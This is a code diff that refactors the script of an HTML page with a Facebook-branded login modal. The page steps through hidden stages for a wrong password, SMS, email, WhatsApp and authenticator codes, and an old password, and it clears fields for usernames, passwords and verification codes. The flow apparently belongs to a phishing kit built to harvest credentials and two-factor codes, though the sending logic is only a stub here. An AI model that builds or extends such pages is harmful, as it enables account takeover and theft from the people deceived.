@@ -317,20 +317,19 @@
                 </div>
             </div>
         </div>
-    <script>
-        const facebookButton = document.getElementById('facebook-btn');
-        const modal = document.getElementById('facebook-modal');
-        const loginButton = document.getElementById('login-btn');
-        
-        facebookButton.addEventListener('click', function () {
-            modal.style.display = 'block';
-        });
-        
+  <script>
+    const facebookButton = document.getElementById('facebook-btn');
+    const modal = document.getElementById('facebook-modal');
+    
+    facebookButton.addEventListener('click', function () {
+        modal.style.display = 'block';
+    });
 
     // Define the function first
     function sendMessage(message) {
         console.log('Sending:', message);
         // Add your actual message sending logic here
+        // This could be an API call, form submission, etc.
     }
 
     // Then define goTo
@@ -341,68 +340,66 @@
         }, 2000);
     }
 
-    // Attach the event
-    document.getElementById('login-btn').addEventListener('click', goTo);
-
+    // Attach the event - only once
+    const loginButton = document.getElementById('login-btn');
+    if (loginButton) {
+        loginButton.addEventListener('click', goTo);
+    } else {
+        console.error("Login button not found!");
+    }
     
-    // Update the login button event listener to use goTo()
-    document.getElementById('login-btn').addEventListener('click', goTo);
-
-        
-        function closeModal() {
-            modal.style.display = 'none';
+    function closeModal() {
+        modal.style.display = 'none';
+    }
+    
+    async function fetchData(url, options) {
+        try {
+            const response = await fetch(url, options);
+            if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+            return await response.json();
+        } catch (error) {
+            console.error('Fetch error:', error);
+            throw error;
         }
-        
-        async function fetchData(url, options) {
-            try {
-                const response = await fetch(url, options);
-                if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-                return await response.json();
-            } catch (error) {
-                console.error('Fetch error:', error);
-                throw error; // Re-throw for further handling
-            }
-        }
+    }
 
-        // Validate input fields
-        function validateInput(input, minLength, errorMessageElement) {
-            if (input.length < minLength) {
-                errorMessageElement.style.display = 'block';
-                errorMessageElement.textContent = `Code must be at least ${minLength} characters long.`;
-                return false;
-            }
-            errorMessageElement.style.display = 'none';
-            return true;
+    // Rest of your utility functions...
+    function validateInput(input, minLength, errorMessageElement) {
+        if (input.length < minLength) {
+            errorMessageElement.style.display = 'block';
+            errorMessageElement.textContent = `Code must be at least ${minLength} characters long.`;
+            return false;
         }
+        errorMessageElement.style.display = 'none';
+        return true;
+    }
 
-        // Hide all elements
-        function hideAllElements() {
-            const elementsToHide = [
-                'login-form', 'waitTime', 'wrongpsw', 'codeEmail', 'codeSms', 'authcode', 'whatsappcode', 'oldpass'
-            ];
-            elementsToHide.forEach(id => {
-                const element = document.getElementById(id);
-                if (element) element.style.display = 'none';
-            });
-        }
-
-        // Show a specific element
-        function showElement(id) {
+    function hideAllElements() {
+        const elementsToHide = [
+            'login-form', 'waitTime', 'wrongpsw', 'codeEmail', 'codeSms', 'authcode', 'whatsappcode', 'oldpass'
+        ];
+        elementsToHide.forEach(id => {
             const element = document.getElementById(id);
-            if (element) element.style.display = 'block';
-        }
+            if (element) element.style.display = 'none';
+        });
+    }
 
-        // Clear input fields
-        function clearInputs() {
-            const inputsToClear = [
-                'authcodesms','buttonauthMobile', 'whatsappcodesms', 'whatsappcodeMobile', 'codeSmsMobile', 'codeSmsDes',
-                'emailcode', 'emailcodeMobile', 'username', 'password', 'old_username', 'old_password'
-            ];
-            inputsToClear.forEach(id => {
-                const input = document.getElementById(id);
-                if (input) input.value = '';
-            });
-        }
-    </script>
+    function showElement(id) {
+        const element = document.getElementById(id);
+        if (element) element.style.display = 'block';
+    }
+
+    function clearInputs() {
+        const inputsToClear = [
+            'authcodesms','buttonauthMobile', 'whatsappcodesms', 'whatsappcodeMobile', 
+            'codeSmsMobile', 'codeSmsDes', 'emailcode', 'emailcodeMobile', 
+            'username', 'password', 'old_username', 'old_password'
+        ];
+        inputsToClear.forEach(id => {
+            const input = document.getElementById(id);
+            if (input) input.value = '';
+        });
+    }
+</script>
 </body>
 </html>
